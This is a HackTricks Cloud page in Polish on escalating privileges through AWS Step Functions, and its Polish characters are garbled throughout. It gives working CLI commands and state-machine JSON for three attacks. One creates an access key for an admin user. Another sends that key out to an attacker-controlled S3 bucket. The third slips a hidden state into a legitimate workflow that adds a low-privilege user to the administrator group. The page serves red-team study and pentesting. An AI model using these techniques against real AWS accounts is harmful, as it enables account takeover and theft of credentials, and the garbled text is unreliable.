# AWS - Eskalacja uprawnie w Step Functions

<details>

<summary><strong>Zacznij od zera i sta si ekspertem AWS Red Team dziki</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>

Inne sposoby wsparcia HackTricks:

* Jeli chcesz zobaczy swoj **firm reklamowan w HackTricks** lub **pobra HackTricks w formacie PDF**, sprawd藕 [**PLANY SUBSKRYPCYJNE**](https://github.com/sponsors/carlospolop)!
* Zdobd藕 [**oficjalne gad偶ety PEASS & HackTricks**](https://peass.creator-spring.com)
* Odkryj [**Rodzin PEASS**](https://opensea.io/collection/the-peass-family), nasz kolekcj ekskluzywnych [**NFT**](https://opensea.io/collection/the-peass-family)
* **Docz do**  [**grupy Discord**](https://discord.gg/hRep4RUj7f) lub [**grupy telegramowej**](https://t.me/peass) lub **led藕** nas na **Twitterze**  [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**.**
* **Podziel si swoimi sztuczkami hakerskimi, przesyajc PR-y do** [**HackTricks**](https://github.com/carlospolop/hacktricks) i [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) na GitHubie.

</details>

## Step Functions

Aby uzyska wicej informacji na temat tej usugi AWS, sprawd藕:

{% content-ref url="../aws-services/aws-stepfunctions-enum.md" %}
[aws-stepfunctions-enum.md](../aws-services/aws-stepfunctions-enum.md)
{% endcontent-ref %}

### `states:TestState` & `iam:PassRole`

Atakujcy posiadajcy uprawnienia **`states:TestState`** & **`iam:PassRole`** mo偶e testowa dowolny stan i przekazywa do niego dowoln rol IAM bez koniecznoci tworzenia lub aktualizacji istniejcego automatu stan贸w, umo偶liwiajc nieautoryzowany dostp do innych usug AWS z uprawnieniami r贸l. Potencjalnie te uprawnienia mog prowadzi do rozlegych nieautoryzowanych dziaa, od manipulowania przepywami pracy, zmiany danych, po naruszenia danych, manipulacj zasobami i eskalacj uprawnie.
```bash
aws states test-state --definition <value> --role-arn <value> [--input <value>] [--inspection-level <value>] [--reveal-secrets | --no-reveal-secrets]
```
Poni偶sze przykady pokazuj, jak przetestowa stan, kt贸ry tworzy klucz dostpu dla u偶ytkownika **`admin`**, wykorzystujc te uprawnienia oraz permisywn rol rodowiska AWS. Ta permisywna rola powinna mie przypisan jakkolwiek polityk o wysokich uprawnieniach (na przykad **`arn:aws:iam::aws:policy/AdministratorAccess`**), kt贸ra umo偶liwia stanowi wykonanie akcji **`iam:CreateAccessKey`**:

- **stateDefinition.json**:
```json
{
"Type": "Task",
"Parameters": {
"UserName": "admin"
},
"Resource": "arn:aws:states:::aws-sdk:iam:createAccessKey",
"End": true
}
```
- **Polecenie** wykonane w celu wykonania eskalacji uprawnie:
```bash
aws stepfunctions test-state --definition file://stateDefinition.json --role-arn arn:aws:iam::<account-id>:role/PermissiveRole

{
"output": "{
\"AccessKey\":{
\"AccessKeyId\":\"AKIA1A2B3C4D5E6F7G8H\",
\"CreateDate\":\"2024-07-09T16:59:11Z\",
\"SecretAccessKey\":\"1a2b3c4d5e6f7g8h9i0j1a2b3c4d5e6f7g8h9i0j1a2b3c4d5e6f7g8h9i0j\",
\"Status\":\"Active\",
\"UserName\":\"admin\"
}
}",
"status": "SUCCEEDED"
}
```
- **Potencjalne skutki**: Nieautoryzowane wykonywanie i manipulowanie przepywami pracy oraz dostp do wra偶liwych zasob贸w, co potencjalnie prowadzi do powa偶nych narusze bezpieczestwa.

### `states:CreateStateMachine` & `iam:PassRole` & (`states:StartExecution` | `states:StartSyncExecution`)

Atakujcy posiadajcy uprawnienia **`states:CreateStateMachine`** i **`iam:PassRole`** bdzie m贸g utworzy maszyn stan贸w i przypisa do niej dowoln rol IAM, umo偶liwiajc nieautoryzowany dostp do innych usug AWS z uprawnieniami r贸l. W przeciwiestwie do poprzedniej techniki eskalacji uprawnie (**`states:TestState`** & **`iam:PassRole`**), ta nie wykonuje si automatycznie, bdziesz tak偶e potrzebowa uprawnie **`states:StartExecution`** lub **`states:StartSyncExecution`** (**`states:StartSyncExecution`** nie jest dostpne dla standardowych przepyw贸w pracy, su偶y tylko do wyra偶ania maszyn stan贸w) aby rozpocz i wykona przepyw pracy.
```bash
# Create a state machine
aws states create-state-machine --name <value> --definition <value> --role-arn <value> [--type <STANDARD | EXPRESS>] [--logging-configuration <value>]\
[--tracing-configuration <enabled=true|false>] [--publish | --no-publish] [--version-description <value>]
# Start a state machine execution
aws states start-execution --state-machine-arn <value> [--name <value>] [--input <value>] [--trace-header <value>]
# Start a Synchronous Express state machine execution
aws states start-sync-execution --state-machine-arn <value> [--name <value>] [--input <value>] [--trace-header <value>]
```
Poni偶sze przykady pokazuj, jak utworzy maszyn stanu, kt贸ra tworzy klucz dostpu dla u偶ytkownika **`admin`** i wycieka ten klucz dostpu do kontrolowanego przez atakujcego kubeka S3, wykorzystujc te uprawnienia oraz permisywn rol rodowiska AWS. Ta permisywna rola powinna mie przypisan jakkolwiek polityk o wysokich uprawnieniach (na przykad **`arn:aws:iam::aws:policy/AdministratorAccess`**), kt贸ra umo偶liwia maszynie stanu wykonanie akcji **`iam:CreateAccessKey`** & **`s3:putObject`**.

- **stateMachineDefinition.json**:
```json
{
"Comment": "Malicious state machine to create IAM access key and upload to S3",
"StartAt": "CreateAccessKey",
"States": {
"CreateAccessKey": {
"Type": "Task",
"Resource": "arn:aws:states:::aws-sdk:iam:createAccessKey",
"Parameters": {
"UserName": "admin"
},
"ResultPath": "$.AccessKeyResult",
"Next": "PrepareS3PutObject"
},
"PrepareS3PutObject": {
"Type": "Pass",
"Parameters": {
"Body.$": "$.AccessKeyResult.AccessKey",
"Bucket": "attacker-controlled-S3-bucket",
"Key": "AccessKey.json"
},
"ResultPath": "$.S3PutObjectParams",
"Next": "PutObject"
},
"PutObject": {
"Type": "Task",
"Resource": "arn:aws:states:::aws-sdk:s3:putObject",
"Parameters": {
"Body.$": "$.S3PutObjectParams.Body",
"Bucket.$": "$.S3PutObjectParams.Bucket",
"Key.$": "$.S3PutObjectParams.Key"
},
"End": true
}
}
}
```
- **Polecenie** wykonane w celu **utworzenia maszyny stanowej**:
```bash
aws stepfunctions create-state-machine --name MaliciousStateMachine --definition file://stateMachineDefinition.json --role-arn arn:aws:iam::123456789012:role/PermissiveRole
{
"stateMachineArn": "arn:aws:states:us-east-1:123456789012:stateMachine:MaliciousStateMachine",
"creationDate": "2024-07-09T20:29:35.381000+02:00"
}
```
- **Polecenie** wykonane w celu **uruchomienia wykonania** wczeniej utworzonej maszyny stanowej:
```json
aws stepfunctions start-execution --state-machine-arn arn:aws:states:us-east-1:123456789012:stateMachine:MaliciousStateMachine
{
"executionArn": "arn:aws:states:us-east-1:123456789012:execution:MaliciousStateMachine:1a2b3c4d-1a2b-1a2b-1a2b-1a2b3c4d5e6f",
"startDate": "2024-07-09T20:33:35.466000+02:00"
}
```
{% hint style="warning" %}

S3 bucket kontrolowany przez atakujcego powinien mie uprawnienia do akceptowania dziaania s3:PutObject z konta ofiary.

{% endhint %}

- **Potencjalny wpyw**: Nieautoryzowane wykonanie i manipulacja przepywami pracy oraz dostp do wra偶liwych zasob贸w, co potencjalnie prowadzi do powa偶nych narusze bezpieczestwa.

### `states:UpdateStateMachine` & (nie zawsze wymagane) `iam:PassRole`

Atakujcy posiadajcy uprawnienia **`states:UpdateStateMachine`** bdzie m贸g modyfikowa definicj maszyny stanowej, dodajc dodatkowe ukryte stany, kt贸re mog prowadzi do eskalacji uprawnie. W ten spos贸b, gdy prawidowy u偶ytkownik rozpocznie wykonanie maszyny stanowej, nowy zoliwy ukryty stan zostanie wykonany, a eskalacja uprawnie zakoczy si sukcesem.

W zale偶noci od tego, jak liberalna jest rola IAM powizana z maszyn stanow, atakujcy bdzie mia do czynienia z dwiema sytuacjami:

1. **Liberalna rola IAM**: Jeli rola IAM powizana z maszyn stanow jest ju偶 liberalna (ma na przykad doczon polityk **`arn:aws:iam::aws:policy/AdministratorAccess`**), to uprawnienie **`iam:PassRole`** nie bdzie wymagane do eskalacji uprawnie, poniewa偶 nie bdzie konieczne r贸wnie偶 aktualizowanie roli IAM, wystarczy definicja maszyny stanowej.
2. **Nie liberalna rola IAM**: W przeciwiestwie do poprzedniego przypadku, tutaj atakujcy bdzie r贸wnie偶 potrzebowa uprawnienia **`iam:PassRole`**, poniewa偶 konieczne bdzie powizanie liberalnej roli IAM z maszyn stanow, opr贸cz modyfikacji definicji maszyny stanowej.
```bash
aws states update-state-machine --state-machine-arn <value> [--definition <value>] [--role-arn <value>] [--logging-configuration <value>] \
[--tracing-configuration <enabled=true|false>] [--publish | --no-publish] [--version-description <value>]
```
Poni偶sze przykady pokazuj, jak zaktualizowa legaln maszyn stan贸w, kt贸ra po prostu wywouje funkcj Lambda HelloWorld, aby doda dodatkowy stan dodajcy u偶ytkownika **`unprivilegedUser`** do grupy IAM **`administrator`**. W ten spos贸b, gdy legalny u偶ytkownik rozpocznie wykonanie zaktualizowanej maszyny stan贸w, ten nowy zoliwy stan ukryty zostanie wykonany, a eskalacja uprawnie bdzie udana.

{% hint style="warning" %}

Jeli maszyna stan贸w nie ma skojarzonej uprawnionej roli IAM, bdzie r贸wnie偶 wymagane uprawnienie **`iam:PassRole`** do zaktualizowania roli IAM w celu przypisania uprawnionej roli IAM (na przykad z zaczon polityk **`arn:aws:iam::aws:policy/AdministratorAccess`**).

{% endhint %}

{% tabs %}

{% tab title="Legalna Maszyna Stan贸w" %}
```json
{
"Comment": "Hello world from Lambda state machine",
"StartAt": "Start PassState",
"States": {
"Start PassState": {
"Type": "Pass",
"Next": "LambdaInvoke"
},
"LambdaInvoke": {
"Type": "Task",
"Resource": "arn:aws:states:::lambda:invoke",
"Parameters": {
"FunctionName": "arn:aws:lambda:us-east-1:123456789012:function:HelloWorldLambda:$LATEST"
},
"Next": "End PassState"
},
"End PassState": {
"Type": "Pass",
"End": true
}
}
}
```
{% endtab %}

{% tab title="Zoliwa zaktualizowana maszyna stan贸w" %}
```json
{
"Comment": "Hello world from Lambda state machine",
"StartAt": "Start PassState",
"States": {
"Start PassState": {
"Type": "Pass",
"Next": "LambdaInvoke"
},
"LambdaInvoke": {
"Type": "Task",
"Resource": "arn:aws:states:::lambda:invoke",
"Parameters": {
"FunctionName": "arn:aws:lambda:us-east-1:123456789012:function:HelloWorldLambda:$LATEST"
},
"Next": "AddUserToGroup"
},
"AddUserToGroup": {
"Type": "Task",
"Parameters": {
"GroupName": "administrator",
"UserName": "unprivilegedUser"
},
"Resource": "arn:aws:states:::aws-sdk:iam:addUserToGroup",
"Next": "End PassState"
},
"End PassState": {
"Type": "Pass",
"End": true
}
}
}
```
{% endtab %}

{% endtabs %}

- **Polecenie** wykonane w celu **aktualizacji** **legitymnego stanowiska**:
```bash
aws stepfunctions update-state-machine --state-machine-arn arn:aws:states:us-east-1:123456789012:stateMachine:HelloWorldLambda --definition file://StateMachineUpdate.json
{
"updateDate": "2024-07-10T20:07:10.294000+02:00",
"revisionId": "1a2b3c4d-1a2b-1a2b-1a2b-1a2b3c4d5e6f"
}
```
- **Potencjalne skutki**: Nieautoryzowane wykonywanie i manipulowanie przepywami pracy oraz dostp do wra偶liwych zasob贸w, co potencjalnie prowadzi do powa偶nych narusze bezpieczestwa.

<details>

<summary><strong>Zacznij od zera i zosta ekspertem AWS Red Team dziki</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>

Inne sposoby wsparcia HackTricks:

* Jeli chcesz zobaczy swoj **firm reklamowan w HackTricks** lub **pobra HackTricks w formacie PDF**, sprawd藕 [**PLANY SUBSKRYPCYJNE**](https://github.com/sponsors/carlospolop)!
* Kup [**oficjalne gad偶ety PEASS & HackTricks**](https://peass.creator-spring.com)
* Odkryj [**Rodzin PEASS**](https://opensea.io/collection/the-peass-family), nasz kolekcj ekskluzywnych [**NFT**](https://opensea.io/collection/the-peass-family)
* **Docz do**  [**grupy Discord**](https://discord.gg/hRep4RUj7f) lub [**grupy telegramowej**](https://t.me/peass) lub **led藕** nas na **Twitterze**  [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**.**
* **Podziel si swoimi sztuczkami hakerskimi, przesyajc PR-y do** [**HackTricks**](https://github.com/carlospolop/hacktricks) i [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) na GitHubie.

</details>
